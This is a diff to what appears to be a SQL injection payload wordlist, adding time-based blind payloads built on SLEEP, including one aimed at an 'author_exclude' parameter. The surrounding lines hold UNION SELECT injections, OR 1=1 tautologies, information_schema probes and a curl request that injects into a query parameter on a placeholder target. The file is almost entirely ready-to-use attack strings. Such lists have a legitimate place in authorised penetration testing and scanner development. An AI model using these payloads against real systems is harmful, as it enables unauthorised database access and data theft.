@@ -34,6 +34,9 @@
 1' AND (SELECT 6268 FROM (SELECT(SLEEP(5)))ghXo) AND 'IKlK'='IKlK
 1' UNION SELECT "' UNION SELECT 1,2,3'-- ","456","789"--
 1' UNION SELECT "1' ORDER BY 3-- ","456","789" --
+1) OR SLEEP(0)-- -
+1) OR SLEEP(0.01)-- -
+1) OR SLEEP(0.3)-- -
 123' UNION SELECT "' UNION SELECT 1,2,'../api/x'-- ","456","789"--
 99' OR 1=1-- -
 99' OR 5=1-- -
@@ -54,6 +57,7 @@ admin' AND (length((select table_name from information_schema.tables where table
 alice' OR 1=1--
 alice' || '1' ; && 1<=>0 && 1-1 && 1<=>1 && 1#
 asdasd' UNION ALL SELECT 1,1,1;/*
+author_exclude=1) OR SLEEP(N)-- -
 curl -H 'Host: target.com' -H 'Cookie: PHPSESSID=XXXXX' 'https://target.com/████.php?entity_type=restaurant&entity_id=1+or+if(mid(@@version,1,1)=5,1,2)=2%23' -k
 grinch' AND 1=1;--
 grinch' or '1'='(Select column_name FROM all_tables WHERE table_name like 'a%')--
